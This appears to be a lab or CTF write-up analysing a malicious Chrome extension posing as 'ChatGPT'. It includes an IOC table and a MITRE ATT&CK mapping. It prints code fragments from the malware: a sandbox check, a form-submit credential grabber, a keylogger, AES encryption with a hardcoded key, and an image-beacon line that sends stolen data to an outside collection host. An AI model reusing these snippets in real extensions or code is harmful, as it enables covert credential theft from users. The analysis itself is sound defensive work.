# 🔍 FakeGPT — Malicious Browser Extension Analysis

---

## 📌 Scenario

Employees reported unusual browser behavior after installing a Chrome extension called **"ChatGPT"** — claiming to be an AI assistant. Accounts were being compromised and sensitive data was leaking. My task was to analyze the extension and identify all malicious components.

---

## 🗂️ Files Found

| File | Purpose |
|------|---------|
| `manifest.json` | Extension config — permissions, scripts, popup |
| `loader.js` | Background script — anti-sandbox + payload loader |
| `app.js` | Core malware — keylogger + credential stealer |
| `crypto.js` | AES encryption of stolen data |
| `ui.html` | Fake popup UI — "Welcome to ChatGPT" |
| `img.GIF` | Decoy image file |

---

## 🧩 Analysis

### 1. `manifest.json` — Over-Privileged Extension Config

The `manifest.json` is the identity + settings file for any Chrome extension. This one requests **way more permissions than any AI assistant would ever need:**
```json
"permissions": [
  "tabs",
  "http://*/*",
  "https://*/*",
  "storage",
  "webRequest",
  "webRequestBlocking",
  "cookies"
]
```

🚩 **Red flags:**
- `"http://*/*"` + `"https://*/*"` → access to **every** website
- `"webRequest"` + `"webRequestBlocking"` → can intercept AND modify network requests
- `"cookies"` → can steal session cookies
- `"matches": ["<all_urls>"]` in content scripts → injects `app.js` into **every** page visited
- `"persistent": true` → always running in the background

---

### 2. `loader.js` — Anti-Sandbox Evasion
```js
if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
  alert("Virtual environment detected. Extension will disable itself.");
  chrome.runtime.onMessage.addListener(() => { return false; });
}
```

🚩 **What this does:**
- Checks if `navigator.plugins.length === 0` → sandboxes and headless browsers typically have no plugins
- Checks for `HeadlessChrome` in the user agent string → detects automated analysis tools
- If either check fires → **extension disables itself** to avoid being caught by security scanners

Also dynamically loads `app.js` at runtime instead of declaring it statically — another evasion trick against static analysis.

---

### 3. `app.js` — Core Malware (Keylogger + Credential Stealer)

#### Step 1: Obfuscated Target Domain
```js
const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
```

The target URL is **Base64-encoded** to hide it from casual inspection.  
I decoded it using CyberChef → **From Base64:**
```
Input:  d3d3LmZhY2Vib29rLmNvbQ==
Output: www.facebook.com
```

✅ Confirmed target: **Facebook login credentials**

---

#### Step 2: Form Hijacking (Credential Theft)
```js
document.addEventListener('submit', function(event) {
  let username = formData.get('username') || formData.get('email');
  let password = formData.get('password');
  if (username && password) {
    exfiltrateCredentials(username, password);
  }
});
```

🚩 Intercepts the `submit` event on login forms and captures email + password **before** they leave the browser. The login still works normally — the victim has no idea.

---

#### Step 3: Keylogger
```js
document.addEventListener('keydown', function(event) {
  var key = event.key;
  exfiltrateData('keystroke', key);
});
```

🚩 Every single keypress on Facebook is captured and sent to the C2 — including 2FA codes, messages, everything.

---

#### Step 4: Exfiltration via Image Pixel Beacon
```js
function sendToServer(encryptedData) {
  var img = new Image();
  img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
  document.body.appendChild(img);
}
```

🚩 Data is sent by creating an **invisible image** with stolen data in the URL. This technique bypasses many network monitoring tools because image requests are rarely blocked.

---

### 4. `crypto.js` — AES Encryption of Stolen Data
```js
const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
const iv  = CryptoJS.lib.WordArray.random(16);
const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
```

🚩 AES encryption key `SuperSecretKey123` is **hardcoded in plaintext**. The attacker encrypts the payload to evade network-level DLP/IDS tools — but since the key is hardcoded, analysts can decrypt any captured traffic trivially.

---

## ⛓️ Attack Chain
```
Victim installs "ChatGPT" extension
        ↓
loader.js checks for sandbox/VM → if none, loads app.js
        ↓
app.js injected into every webpage
        ↓
Victim visits www.facebook.com
        ↓
Form submit + keydown events captured
        ↓
Credentials AES-encrypted (key: SuperSecretKey123)
        ↓
Silently exfiltrated → https://Mo.Elshaheedy.com/collect?data=
```

---

## 🧾 IOCs (Indicators of Compromise)

| Type | Indicator |
|------|-----------|
| C2 Domain | `Mo.Elshaheedy.com` |
| C2 URL | `https://Mo.Elshaheedy.com/collect?data=` |
| Hardcoded Key | `SuperSecretKey123` |
| Base64 Encoded Target | `d3d3LmZhY2Vib29rLmNvbQ==` → `www.facebook.com` |
| Extension Name | `ChatGPT v1.0` |
| Malicious Files | `app.js`, `loader.js`, `crypto.js`, `manifest.json` |

---

## 🛡️ MITRE ATT&CK Mapping

| Tactic | Technique ID | Description |
|--------|-------------|-------------|
| Initial Access | T1204 | User manually installs fake extension |
| Persistence | T1176 | Browser extension persists across sessions |
| Defense Evasion | T1497 | Sandbox/VM detection in loader.js |
| Defense Evasion | T1027 | Base64 obfuscation of target domain |
| Credential Access | T1056.003 | Form submit event hijacking |
| Credential Access | T1056.001 | Keylogging on target domain |
| Exfiltration | T1041 | AES-encrypted data via image pixel beacon to C2 |

---

## ✅ Key Takeaways

- Always check extension permissions before installing — legit AI tools don't need `webRequestBlocking` or `cookies`
- Base64 obfuscation is a common and easily defeated technique — CyberChef breaks it instantly
- Image pixel beacons are a sneaky exfiltration method that bypasses many security tools
- Hardcoded encryption keys are an IOC — good for analysts, lazy for attackers
- Anti-sandbox checks (headless browser detection) are a strong malware indicator
